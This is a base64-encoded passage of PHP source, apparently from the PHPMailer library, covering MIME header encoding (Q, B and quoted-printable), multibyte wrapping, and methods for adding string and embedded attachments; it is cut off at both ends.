ZWZhdWx0OgogICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCdlbmNvZGluZycpIC4gJGVuY29kaW5nKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJGVuY29kZWQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBFbmNvZGUgYSBoZWFkZXIgc3RyaW5nIG9wdGltYWxseS4KICAgICAqIFBpY2tzIHNob3J0ZXN0IG9mIFEsIEIsIHF1b3RlZC1wcmludGFibGUgb3Igbm9uZS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBvc2l0aW9uCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlSGVhZGVyKCRzdHIsICRwb3NpdGlvbiA9ICd0ZXh0JykKICAgIHsKICAgICAgICAkbWF0Y2hjb3VudCA9IDA7CiAgICAgICAgc3dpdGNoIChzdHJ0b2xvd2VyKCRwb3NpdGlvbikpIHsKICAgICAgICAgICAgY2FzZSAncGhyYXNlJzoKICAgICAgICAgICAgICAgIGlmICghcHJlZ19tYXRjaCgnL1tcMjAwLVwzNzddLycsICRzdHIpKSB7CiAgICAgICAgICAgICAgICAgICAgLy8gQ2FuJ3QgdXNlIGFkZHNsYXNoZXMgYXMgd2UgZG9uJ3Qga25vdyB0aGUgdmFsdWUgb2YgbWFnaWNfcXVvdGVzX3N5YmFzZQogICAgICAgICAgICAgICAgICAgICRlbmNvZGVkID0gYWRkY3NsYXNoZXMoJHN0ciwgIlwwLi5cMzdcMTc3XFxcIiIpOwogICAgICAgICAgICAgICAgICAgIGlmICgoJHN0ciA9PSAkZW5jb2RlZCkgJiYgIXByZWdfbWF0Y2goJy9bXkEtWmEtejAtOSEjJCUmXCcqK1wvPT9eX2B7fH1+IC1dLycsICRzdHIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoJGVuY29kZWQpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAoIlwiJGVuY29kZWRcIiIpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRtYXRjaGNvdW50ID0gcHJlZ19tYXRjaF9hbGwoJy9bXlwwNDBcMDQxXDA0My1cMTMzXDEzNS1cMTc2XS8nLCAkc3RyLCAkbWF0Y2hlcyk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgLyoqIEBub2luc3BlY3Rpb24gUGhwTWlzc2luZ0JyZWFrU3RhdGVtZW50SW5zcGVjdGlvbiAqLwogICAgICAgICAgICBjYXNlICdjb21tZW50JzoKICAgICAgICAgICAgICAgICRtYXRjaGNvdW50ID0gcHJlZ19tYXRjaF9hbGwoJy9bKCkiXS8nLCAkc3RyLCAkbWF0Y2hlcyk7CiAgICAgICAgICAgICAgICAvLyBJbnRlbnRpb25hbCBmYWxsLXRocm91Z2gKICAgICAgICAgICAgY2FzZSAndGV4dCc6CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAkbWF0Y2hjb3VudCArPSBwcmVnX21hdGNoX2FsbCgnL1tcMDAwLVwwMTBcMDEzXDAxNFwwMTYtXDAzN1wxNzctXDM3N10vJywgJHN0ciwgJG1hdGNoZXMpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQoKICAgICAgICAvL1RoZXJlIGFyZSBubyBjaGFycyB0aGF0IG5lZWQgZW5jb2RpbmcKICAgICAgICBpZiAoJG1hdGNoY291bnQgPT0gMCkgewogICAgICAgICAgICByZXR1cm4gKCRzdHIpOwogICAgICAgIH0KCiAgICAgICAgJG1heGxlbiA9IDc1IC0gNyAtIHN0cmxlbigkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgLy8gVHJ5IHRvIHNlbGVjdCB0aGUgZW5jb2Rpbmcgd2hpY2ggc2hvdWxkIHByb2R1Y2UgdGhlIHNob3J0ZXN0IG91dHB1dAogICAgICAgIGlmICgkbWF0Y2hjb3VudCA+IHN0cmxlbigkc3RyKSAvIDMpIHsKICAgICAgICAgICAgLy8gTW9yZSB0aGFuIGEgdGhpcmQgb2YgdGhlIGNvbnRlbnQgd2lsbCBuZWVkIGVuY29kaW5nLCBzbyBCIGVuY29kaW5nIHdpbGwgYmUgbW9zdCBlZmZpY2llbnQKICAgICAgICAgICAgJGVuY29kaW5nID0gJ0InOwogICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSAmJiAkdGhpcy0+aGFzTXVsdGlCeXRlcygkc3RyKSkgewogICAgICAgICAgICAgICAgLy8gVXNlIGEgY3VzdG9tIGZ1bmN0aW9uIHdoaWNoIGNvcnJlY3RseSBlbmNvZGVzIGFuZCB3cmFwcyBsb25nCiAgICAgICAgICAgICAgICAvLyBtdWx0aWJ5dGUgc3RyaW5ncyB3aXRob3V0IGJyZWFraW5nIGxpbmVzIHdpdGhpbiBhIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgJGVuY29kZWQgPSAkdGhpcy0+YmFzZTY0RW5jb2RlV3JhcE1CKCRzdHIsICJcbiIpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBiYXNlNjRfZW5jb2RlKCRzdHIpOwogICAgICAgICAgICAgICAgJG1heGxlbiAtPSAkbWF4bGVuICUgNDsKICAgICAgICAgICAgICAgICRlbmNvZGVkID0gdHJpbShjaHVua19zcGxpdCgkZW5jb2RlZCwgJG1heGxlbiwgIlxuIikpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGVuY29kaW5nID0gJ1EnOwogICAgICAgICAgICAkZW5jb2RlZCA9ICR0aGlzLT5lbmNvZGVRKCRzdHIsICRwb3NpdGlvbik7CiAgICAgICAgICAgICRlbmNvZGVkID0gJHRoaXMtPndyYXBUZXh0KCRlbmNvZGVkLCAkbWF4bGVuLCB0cnVlKTsKICAgICAgICAgICAgJGVuY29kZWQgPSBzdHJfcmVwbGFjZSgnPScgLiBzZWxmOjpDUkxGLCAiXG4iLCB0cmltKCRlbmNvZGVkKSk7CiAgICAgICAgfQoKICAgICAgICAkZW5jb2RlZCA9IHByZWdfcmVwbGFjZSgnL14oLiopJC9tJywgJyA9PycgLiAkdGhpcy0+Q2hhclNldCAuICI/JGVuY29kaW5nP1xcMT89IiwgJGVuY29kZWQpOwogICAgICAgICRlbmNvZGVkID0gdHJpbShzdHJfcmVwbGFjZSgiXG4iLCAkdGhpcy0+TEUsICRlbmNvZGVkKSk7CgogICAgICAgIHJldHVybiAkZW5jb2RlZDsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIGlmIGEgc3RyaW5nIGNvbnRhaW5zIG11bHRpLWJ5dGUgY2hhcmFjdGVycy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHIgbXVsdGktYnl0ZSB0ZXh0IHRvIHdyYXAgZW5jb2RlCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGhhc011bHRpQnl0ZXMoJHN0cikKICAgIHsKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9zdHJsZW4nKSkgewogICAgICAgICAgICByZXR1cm4gKHN0cmxlbigkc3RyKSA+IG1iX3N0cmxlbigkc3RyLCAkdGhpcy0+Q2hhclNldCkpOwogICAgICAgIH0gZWxzZSB7IC8vIEFzc3VtZSBubyBtdWx0aWJ5dGVzICh3ZSBjYW4ndCBoYW5kbGUgd2l0aG91dCBtYnN0cmluZyBmdW5jdGlvbnMgYW55d2F5KQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogRG9lcyBhIHN0cmluZyBjb250YWluIGFueSA4LWJpdCBjaGFycyAoaW4gYW55IGNoYXJzZXQpPwogICAgICogQHBhcmFtIHN0cmluZyAkdGV4dAogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBoYXM4Yml0Q2hhcnMoJHRleHQpCiAgICB7CiAgICAgICAgcmV0dXJuIChib29sZWFuKXByZWdfbWF0Y2goJy9bXHg4MC1ceEZGXS8nLCAkdGV4dCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBFbmNvZGUgYW5kIHdyYXAgbG9uZyBtdWx0aWJ5dGUgc3RyaW5ncyBmb3IgbWFpbCBoZWFkZXJzCiAgICAgKiB3aXRob3V0IGJyZWFraW5nIGxpbmVzIHdpdGhpbiBhIGNoYXJhY3Rlci4KICAgICAqIEFkYXB0ZWQgZnJvbSBhIGZ1bmN0aW9uIGJ5IHBhcmF2b2lkCiAgICAgKiBAbGluayBodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Z1bmN0aW9uLm1iLWVuY29kZS1taW1laGVhZGVyLnBocCM2MDI4MwogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0ciBtdWx0aS1ieXRlIHRleHQgdG8gd3JhcCBlbmNvZGUKICAgICAqIEBwYXJhbSBzdHJpbmcgJGxpbmVicmVhayBzdHJpbmcgdG8gdXNlIGFzIGxpbmVmZWVkL2VuZC1vZi1saW5lCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYmFzZTY0RW5jb2RlV3JhcE1CKCRzdHIsICRsaW5lYnJlYWsgPSBudWxsKQogICAgewogICAgICAgICRzdGFydCA9ICc9PycgLiAkdGhpcy0+Q2hhclNldCAuICc/Qj8nOwogICAgICAgICRlbmQgPSAnPz0nOwogICAgICAgICRlbmNvZGVkID0gJyc7CiAgICAgICAgaWYgKCRsaW5lYnJlYWsgPT09IG51bGwpIHsKICAgICAgICAgICAgJGxpbmVicmVhayA9ICR0aGlzLT5MRTsKICAgICAgICB9CgogICAgICAgICRtYl9sZW5ndGggPSBtYl9zdHJsZW4oJHN0ciwgJHRoaXMtPkNoYXJTZXQpOwogICAgICAgIC8vIEVhY2ggbGluZSBtdXN0IGhhdmUgbGVuZ3RoIDw9IDc1LCBpbmNsdWRpbmcgJHN0YXJ0IGFuZCAkZW5kCiAgICAgICAgJGxlbmd0aCA9IDc1IC0gc3RybGVuKCRzdGFydCkgLSBzdHJsZW4oJGVuZCk7CiAgICAgICAgLy8gQXZlcmFnZSBtdWx0aS1ieXRlIHJhdGlvCiAgICAgICAgJHJhdGlvID0gJG1iX2xlbmd0aCAvIHN0cmxlbigkc3RyKTsKICAgICAgICAvLyBCYXNlNjQgaGFzIGEgNDozIHJhdGlvCiAgICAgICAgJGF2Z0xlbmd0aCA9IGZsb29yKCRsZW5ndGggKiAkcmF0aW8gKiAuNzUpOwoKICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAkbWJfbGVuZ3RoOyAkaSArPSAkb2Zmc2V0KSB7CiAgICAgICAgICAgICRsb29rQmFjayA9IDA7CiAgICAgICAgICAgIGRvIHsKICAgICAgICAgICAgICAgICRvZmZzZXQgPSAkYXZnTGVuZ3RoIC0gJGxvb2tCYWNrOwogICAgICAgICAgICAgICAgJGNodW5rID0gbWJfc3Vic3RyKCRzdHIsICRpLCAkb2Zmc2V0LCAkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgICAgICAgICAkY2h1bmsgPSBiYXNlNjRfZW5jb2RlKCRjaHVuayk7CiAgICAgICAgICAgICAgICAkbG9va0JhY2srKzsKICAgICAgICAgICAgfSB3aGlsZSAoc3RybGVuKCRjaHVuaykgPiAkbGVuZ3RoKTsKICAgICAgICAgICAgJGVuY29kZWQgLj0gJGNodW5rIC4gJGxpbmVicmVhazsKICAgICAgICB9CgogICAgICAgIC8vIENob21wIHRoZSBsYXN0IGxpbmVmZWVkCiAgICAgICAgJGVuY29kZWQgPSBzdWJzdHIoJGVuY29kZWQsIDAsIC1zdHJsZW4oJGxpbmVicmVhaykpOwogICAgICAgIHJldHVybiAkZW5jb2RlZDsKICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhIHN0cmluZyBpbiBxdW90ZWQtcHJpbnRhYmxlIGZvcm1hdC4KICAgICAqIEFjY29yZGluZyB0byBSRkMyMDQ1IHNlY3Rpb24gNi43LgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZyBUaGUgdGV4dCB0byBlbmNvZGUKICAgICAqIEBwYXJhbSBpbnRlZ2VyICRsaW5lX21heCBOdW1iZXIgb2YgY2hhcnMgYWxsb3dlZCBvbiBhIGxpbmUgYmVmb3JlIHdyYXBwaW5nCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5xdW90ZWQtcHJpbnRhYmxlLWRlY29kZS5waHAjODk0MTcgQWRhcHRlZCBmcm9tIHRoaXMgY29tbWVudAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlUVAoJHN0cmluZywgJGxpbmVfbWF4ID0gNzYpCiAgICB7CiAgICAgICAgLy8gVXNlIG5hdGl2ZSBmdW5jdGlvbiBpZiBpdCdzIGF2YWlsYWJsZSAoPj0gUEhQNS4zKQogICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ3F1b3RlZF9wcmludGFibGVfZW5jb2RlJykpIHsKICAgICAgICAgICAgcmV0dXJuIHF1b3RlZF9wcmludGFibGVfZW5jb2RlKCRzdHJpbmcpOwogICAgICAgIH0KICAgICAgICAvLyBGYWxsIGJhY2sgdG8gYSBwdXJlIFBIUCBpbXBsZW1lbnRhdGlvbgogICAgICAgICRzdHJpbmcgPSBzdHJfcmVwbGFjZSgKICAgICAgICAgICAgYXJyYXkoJyUyMCcsICclMEQlMEEuJywgJyUwRCUwQScsICclJyksCiAgICAgICAgICAgIGFycmF5KCcgJywgIlxyXG49MkUiLCAiXHJcbiIsICc9JyksCiAgICAgICAgICAgIHJhd3VybGVuY29kZSgkc3RyaW5nKQogICAgICAgICk7CiAgICAgICAgcmV0dXJuIHByZWdfcmVwbGFjZSgnL1teXHJcbl17JyAuICgkbGluZV9tYXggLSAzKSAuICd9W149XHJcbl17Mn0vJywgIiQwPVxyXG4iLCAkc3RyaW5nKTsKICAgIH0KCiAgICAvKioKICAgICAqIEJhY2t3YXJkIGNvbXBhdGliaWxpdHkgd3JhcHBlciBmb3IgYW4gb2xkIFFQIGVuY29kaW5nIGZ1bmN0aW9uIHRoYXQgd2FzIHJlbW92ZWQuCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6ZW5jb2RlUVAoKQogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZwogICAgICogQHBhcmFtIGludGVnZXIgJGxpbmVfbWF4CiAgICAgKiBAcGFyYW0gYm9vbGVhbiAkc3BhY2VfY29udgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqIEBkZXByZWNhdGVkIFVzZSBlbmNvZGVRUCBpbnN0ZWFkLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZW5jb2RlUVBwaHAoCiAgICAgICAgJHN0cmluZywKICAgICAgICAkbGluZV9tYXggPSA3NiwKICAgICAgICAvKiogQG5vaW5zcGVjdGlvbiBQaHBVbnVzZWRQYXJhbWV0ZXJJbnNwZWN0aW9uICovICRzcGFjZV9jb252ID0gZmFsc2UKICAgICkgewogICAgICAgIHJldHVybiAkdGhpcy0+ZW5jb2RlUVAoJHN0cmluZywgJGxpbmVfbWF4KTsKICAgIH0KCiAgICAvKioKICAgICAqIEVuY29kZSBhIHN0cmluZyB1c2luZyBRIGVuY29kaW5nLgogICAgICogQGxpbmsgaHR0cDovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjMjA0NwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIHRoZSB0ZXh0IHRvIGVuY29kZQogICAgICogQHBhcmFtIHN0cmluZyAkcG9zaXRpb24gV2hlcmUgdGhlIHRleHQgaXMgZ29pbmcgdG8gYmUgdXNlZCwgc2VlIHRoZSBSRkMgZm9yIHdoYXQgdGhhdCBtZWFucwogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlbmNvZGVRKCRzdHIsICRwb3NpdGlvbiA9ICd0ZXh0JykKICAgIHsKICAgICAgICAvLyBUaGVyZSBzaG91bGQgbm90IGJlIGFueSBFT0wgaW4gdGhlIHN0cmluZwogICAgICAgICRwYXR0ZXJuID0gJyc7CiAgICAgICAgJGVuY29kZWQgPSBzdHJfcmVwbGFjZShhcnJheSgiXHIiLCAiXG4iKSwgJycsICRzdHIpOwogICAgICAgIHN3aXRjaCAoc3RydG9sb3dlcigkcG9zaXRpb24pKSB7CiAgICAgICAgICAgIGNhc2UgJ3BocmFzZSc6CiAgICAgICAgICAgICAgICAvLyBSRkMgMjA0NyBzZWN0aW9uIDUuMwogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXkEtWmEtejAtOSEqK1wvIC0nOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIC8qKiBAbm9pbnNwZWN0aW9uIFBocE1pc3NpbmdCcmVha1N0YXRlbWVudEluc3BlY3Rpb24gKi8KICAgICAgICAgICAgY2FzZSAnY29tbWVudCc6CiAgICAgICAgICAgICAgICAvLyBSRkMgMjA0NyBzZWN0aW9uIDUuMgogICAgICAgICAgICAgICAgJHBhdHRlcm4gPSAnXChcKSInOwogICAgICAgICAgICAgICAgLy8gaW50ZW50aW9uYWwgZmFsbC10aHJvdWdoCiAgICAgICAgICAgICAgICAvLyBmb3IgdGhpcyByZWFzb24gd2UgYnVpbGQgdGhlICRwYXR0ZXJuIHdpdGhvdXQgaW5jbHVkaW5nIGRlbGltaXRlcnMgYW5kIFtdCiAgICAgICAgICAgIGNhc2UgJ3RleHQnOgogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgLy8gUkZDIDIwNDcgc2VjdGlvbiA1LjEKICAgICAgICAgICAgICAgIC8vIFJlcGxhY2UgZXZlcnkgaGlnaCBhc2NpaSwgY29udHJvbCwgPSwgPyBhbmQgXyBjaGFyYWN0ZXJzCiAgICAgICAgICAgICAgICAkcGF0dGVybiA9ICdcMDAwLVwwMTFcMDEzXDAxNFwwMTYtXDAzN1wwNzVcMDc3XDEzN1wxNzctXDM3NycgLiAkcGF0dGVybjsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICAkbWF0Y2hlcyA9IGFycmF5KCk7CiAgICAgICAgaWYgKHByZWdfbWF0Y2hfYWxsKCIvW3skcGF0dGVybn1dLyIsICRlbmNvZGVkLCAkbWF0Y2hlcykpIHsKICAgICAgICAgICAgLy8gSWYgdGhlIHN0cmluZyBjb250YWlucyBhbiAnPScsIG1ha2Ugc3VyZSBpdCdzIHRoZSBmaXJzdCB0aGluZyB3ZSByZXBsYWNlCiAgICAgICAgICAgIC8vIHNvIGFzIHRvIGF2b2lkIGRvdWJsZS1lbmNvZGluZwogICAgICAgICAgICAkZXFrZXkgPSBhcnJheV9zZWFyY2goJz0nLCAkbWF0Y2hlc1swXSk7CiAgICAgICAgICAgIGlmIChmYWxzZSAhPT0gJGVxa2V5KSB7CiAgICAgICAgICAgICAgICB1bnNldCgkbWF0Y2hlc1swXVskZXFrZXldKTsKICAgICAgICAgICAgICAgIGFycmF5X3Vuc2hpZnQoJG1hdGNoZXNbMF0sICc9Jyk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZm9yZWFjaCAoYXJyYXlfdW5pcXVlKCRtYXRjaGVzWzBdKSBhcyAkY2hhcikgewogICAgICAgICAgICAgICAgJGVuY29kZWQgPSBzdHJfcmVwbGFjZSgkY2hhciwgJz0nIC4gc3ByaW50ZignJTAyWCcsIG9yZCgkY2hhcikpLCAkZW5jb2RlZCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgLy8gUmVwbGFjZSBldmVyeSBzcGFjZXMgdG8gXyAobW9yZSByZWFkYWJsZSB0aGFuID0yMCkKICAgICAgICByZXR1cm4gc3RyX3JlcGxhY2UoJyAnLCAnXycsICRlbmNvZGVkKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhIHN0cmluZyBvciBiaW5hcnkgYXR0YWNobWVudCAobm9uLWZpbGVzeXN0ZW0pLgogICAgICogVGhpcyBtZXRob2QgY2FuIGJlIHVzZWQgdG8gYXR0YWNoIGFzY2lpIG9yIGJpbmFyeSBkYXRhLAogICAgICogc3VjaCBhcyBhIEJMT0IgcmVjb3JkIGZyb20gYSBkYXRhYmFzZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZyBTdHJpbmcgYXR0YWNobWVudCBkYXRhLgogICAgICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUgTmFtZSBvZiB0aGUgYXR0YWNobWVudC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLgogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBGaWxlIGV4dGVuc2lvbiAoTUlNRSkgdHlwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQogICAgICogQHJldHVybiB2b2lkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRTdHJpbmdBdHRhY2htZW50KAogICAgICAgICRzdHJpbmcsCiAgICAgICAgJGZpbGVuYW1lLAogICAgICAgICRlbmNvZGluZyA9ICdiYXNlNjQnLAogICAgICAgICR0eXBlID0gJycsCiAgICAgICAgJGRpc3Bvc2l0aW9uID0gJ2F0dGFjaG1lbnQnCiAgICApIHsKICAgICAgICAvLyBJZiBhIE1JTUUgdHlwZSBpcyBub3Qgc3BlY2lmaWVkLCB0cnkgdG8gd29yayBpdCBvdXQgZnJvbSB0aGUgZmlsZSBuYW1lCiAgICAgICAgaWYgKCR0eXBlID09ICcnKSB7CiAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJGZpbGVuYW1lKTsKICAgICAgICB9CiAgICAgICAgLy8gQXBwZW5kIHRvICRhdHRhY2htZW50IGFycmF5CiAgICAgICAgJHRoaXMtPmF0dGFjaG1lbnRbXSA9IGFycmF5KAogICAgICAgICAgICAwID0+ICRzdHJpbmcsCiAgICAgICAgICAgIDEgPT4gJGZpbGVuYW1lLAogICAgICAgICAgICAyID0+IGJhc2VuYW1lKCRmaWxlbmFtZSksCiAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLAogICAgICAgICAgICA0ID0+ICR0eXBlLAogICAgICAgICAgICA1ID0+IHRydWUsIC8vIGlzU3RyaW5nQXR0YWNobWVudAogICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwKICAgICAgICAgICAgNyA9PiAwCiAgICAgICAgKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFkZCBhbiBlbWJlZGRlZCAoaW5saW5lKSBhdHRhY2htZW50IGZyb20gYSBmaWxlLgogICAgICogVGhpcyBjYW4gaW5jbHVkZSBpbWFnZXMsIHNvdW5kcywgYW5kIGp1c3QgYWJvdXQgYW55IG90aGVyIGRvY3VtZW50IHR5cGUuCiAgICAgKiBUaGVzZSBkaWZmZXIgZnJvbSAncmVndWxhcicgYXR0YWNobWVudHMgaW4gdGhhdCB0aGV5IGFyZSBpbnRlbmRlZCB0byBiZQogICAgICogZGlzcGxheWVkIGlubGluZSB3aXRoIHRoZSBtZXNzYWdlLCBub3QganVzdCBhdHRhY2hlZCBmb3IgZG93bmxvYWQuCiAgICAgKiBUaGlzIGlzIHVzZWQgaW4gSFRNTCBtZXNzYWdlcyB0aGF0IGVtYmVkIHRoZSBpbWFnZXMKICAgICAqIHRoZSBIVE1MIHJlZmVycyB0byB1c2luZyB0aGUgJGNpZCB2YWx1ZS4KICAgICAqIE5ldmVyIHVzZSBhIHVzZXItc3VwcGxpZWQgcGF0aCB0byBhIGZpbGUhCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIFBhdGggdG8gdGhlIGF0dGFjaG1lbnQuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRjaWQgQ29udGVudCBJRCBvZiB0aGUgYXR0YWNobWVudDsgVXNlIHRoaXMgdG8gcmVmZXJlbmNlCiAgICAgKiAgICAgICAgdGhlIGNvbnRlbnQgd2hlbiB1c2luZyBhbiBlbWJlZGRlZCBpbWFnZSBpbiBIVE1MLgogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBPdmVycmlkZXMgdGhlIGF0dGFjaG1lbnQgbmFtZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLgogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBGaWxlIE1JTUUgdHlwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQogICAgICogQHJldHVybiBib29sZWFuIFRydWUgb24gc3VjY2Vzc2Z1bGx5IGFkZGluZyBhbiBhdHRhY2htZW50CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRFbWJlZGRlZEltYWdlKCRwYXRoLCAkY2lkLCAkbmFtZSA9ICcnLCAkZW5jb2RpbmcgPSAnYmFzZTY0JywgJHR5cGUgPSAnJywgJGRpc3Bvc2l0aW9uID0gJ2lubGluZScpCiAgICB7CiAgICAgICAgaWYgKCFzZWxmOjppc1Blcm1pdHRlZFBhdGgoJHBhdGgpIG9yICFAaXNfZmlsZSgkcGF0aCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCR0aGlzLT5sYW5nKCdmaWxlX2FjY2VzcycpIC4gJHBhdGgpOwogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICAvLyBJZiBhIE1JTUUgdHlwZSBpcyBub3Qgc3BlY2lmaWVkLCB0cnkgdG8gd29yayBpdCBvdXQgZnJvbSB0aGUgZmlsZSBuYW1lCiAgICAgICAgaWYgKCR0eXBlID09ICcnKSB7CiAgICAgICAgICAgICR0eXBlID0gc2VsZjo6ZmlsZW5hbWVUb1R5cGUoJHBhdGgpOwogICAgICAgIH0KCiAgICAgICAgJGZpbGVuYW1lID0gYmFzZW5hbWUoJHBhdGgpOwogICAgICAgIGlmICgkbmFtZSA9PSAnJykgewogICAgICAgICAgICAkbmFtZSA9ICRmaWxlbmFtZTsKICAgICAgICB9CgogICAgICAgIC8vIEFwcGVuZCB0byAkYXR0YWNobWVudCBhcnJheQogICAgICAgICR0aGlzLT5hdHRhY2htZW50W10gPSBhcnJheSgKICAgICAgICAgICAgMCA9PiAkcGF0aCwKICAgICAgICAgICAgMSA9PiAkZmlsZW5hbWUsCiAgICAgICAgICAgIDIgPT4gJG5hbWUsCiAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLAogICAgICAgICAgICA0ID0+ICR0eXBlLAogICAgICAgICAgICA1ID0+IGZhbHNlLCAvLyBpc1N0cmluZ0F0dGFjaG1lbnQKICAgICAgICAgICAgNiA9PiAkZGlzcG9zaXRpb24sCiAgICAgICAgICAgIDcgPT4gJGNpZAogICAgICAgICk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBBZGQgYW4gZW1iZWRkZWQgc3RyaW5naWZpZWQgYXR0YWNobWVudC4KICAgICAqIFRoaXMgY2FuIGluY2x1ZGUgaW1hZ2VzLCBzb3VuZHMsIGFuZCBqdXN0IGFib3V0IGFueSBvdGhlciBkb2N1bWVudCB0eXBlLgogICAgICogQmUgc3VyZSB0byBzZXQgdGhlICR0eXBlIHRvIGFuIGltYWdlIHR5cGUgZm9yIGltYWdlczoKICAgICAqIEpQRUcgaW1hZ2VzIHVzZSAnaW1hZ2UvanBlZycsIEdJRiB1c2VzICdpbWFnZS9naWYnLCBQTkcgdXNlcyAnaW1hZ2UvcG5nJy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZyBUaGUgYXR0YWNobWVudCBiaW5hcnkgZGF0YS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGNpZCBDb250ZW50IElEIG9mIHRoZSBhdHRhY2htZW50OyBVc2UgdGhpcyB0byByZWZlcmVuY2UKICAgICAqICAgICAgICB0aGUgY29udGVudCB3aGVuIHVzaW5nIGFuIGVtYmVkZGVkIGltYWdlIGluIEhUTUwuCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlbmNvZGluZyBGaWxlIGVuY29kaW5nIChzZWUgJEVuY29kaW5nKS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgTUlNRSB0eXBlLgogICAgICogQHBhcmFtIHN0cmluZyAkZGlzcG9zaXRpb24gRGlzcG9zaXRpb24gdG8gdXNlCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gVHJ